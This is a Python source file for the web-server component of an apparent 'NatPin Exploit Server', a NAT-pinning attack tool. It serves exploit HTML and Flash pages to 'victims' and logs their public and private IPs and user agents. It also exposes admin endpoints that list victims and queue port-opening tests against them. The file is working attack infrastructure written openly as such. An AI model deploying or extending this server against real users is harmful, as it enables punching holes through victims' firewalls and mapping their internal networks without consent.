#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time

class HTTPProtoHandler(asyncore.dispatcher_with_send):
	REQPAGE = ""
	REQHEADER = ""
	REQHEADERDONE = 0
	def __init__(self,conn_sock, client_address, server):
		global REQHEADER
		global REQHEADERDONE
		REQHEADERDONE = 0
		REQHEADER = ""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort),3)
	def get_header(self,req,header_name,splitter=":"):
		headers=req.split("\n")
		result = ""
		for header in headers:
			headerparts = header.split(splitter)
			if len(headerparts)>1:
				if headerparts[0].strip().upper()==header_name.upper():
					result = header.strip()
		return result
	def handle_read(self):
		global REQPAGE, REQHEADER, REQHEADERDONE
		data = self.recv(1024)
		request = self.get_header(data,"GET", " ")
		cookie = self.get_header(data,"cookie", ":")
		_page = ""
		if request <>"":
			headerparts = request.split(" ")
			if headerparts[0]=="GET":
				_page = headerparts[1].replace("/","")
				if _page =="": _page = "exploit.html"
				self.server.log("Victim requested page: " + _page,3)
		_page=_page.lower()
		page = _page.split("?")[0];
		if page != "":
			arrPages = ["exploit.html","exploit.swf","gremwell_logo.png","login.html"]
			arrAdminPages=["admin.html","admin.js","admin.css"]
			arrCommands = ["xclients","xresults","xtest"]
			if page in arrPages:
				agent = self.get_header(data,"USER-AGENT",":")
				self.server.log("---" + agent,4)
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/"+page,"r")
				body = f.read()
				f.close()
			elif page in arrAdminPages:
				agent = self.get_header(data,"USER-AGENT",":")
				self.server.log("---" + agent,4)
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/"+page,"r")
				body = f.read()
				f.close()			
			elif page.split("?")[0] in arrCommands:
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				body=""
				if page=="xclients":
					clientrowid=0
					for client in self.server.CALLER.getVictims():
						body = body + "<div id='"+client.VIC_ID+"' onclick='handle_clientClick("+str(clientrowid) +");'>"+client.VIC_ID +"</div>" + "|" + client.PUBLIC_IP + "|" + client.PRIVATE_IP + "|" + str(client.LAST_SEEN) + "|" +"\n"
						clientrowid=clientrowid+1
				elif page=="xresults":
					page_parts = _page.split("?")
					if len(page_parts)==2:
						client = self.server.CALLER.getVictimById(int(page_parts[1]));#returns None on error
						if client !=None:
							for result in client.TESTS:
								rsltstr ="Failed"
								if result.RESULT==True: 
									rsltstr="Success"
								body = body + result.TEST_TYPE + "|" + result.STATUS + "|" + result.PRIVATE_IP + "|" + result.PRIVATE_PORT + "|" + rsltstr + "|" + result.PUBLIC_PORT + " (" + result.TRANSPORT + ")\n" 
					else:
						body=""
				elif page=="xtest":
					page_parts = _page.split("?")
					if len(page_parts)==2:
						params = page_parts[1].split("&")
						if len(params)==4:
							if self.server.CALLER.isValidTestCommand(params[0],params[1],params[2],params[3],False)==True:
								client = self.server.CALLER.getVictimById(int(params[0]))
								if params[1].upper() != "ALL":
									client.addTest(params[1].upper(), params[2], params[3])
								else:
									#run all proto tests
									for xproto in self.server.CALLER.PROTOS:
										client.addTest(xproto, params[2], params[3])	
				else:
					body=""
			else:
				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nContent-Length: 0\r\n\r\n"""
				body = ""
			respheader = respheader.replace("$len$",str(len(body)))
			self.send(respheader+body)
			#self.send(body)
#end class

class Server(Base):
	def __init__(self,serverPort=843, caller=None):
		self.TYPE = "Web Server"
		Base.__init__(self,"TCP",serverPort,caller)
		self.log("Started",2)
	#end def
	def protocolhandler(self,conn, addr):
		# FLASH POLICY FILE SUPPORT
		self.HANDLER = HTTPProtoHandler(conn,addr,self)
	#end def
#end class
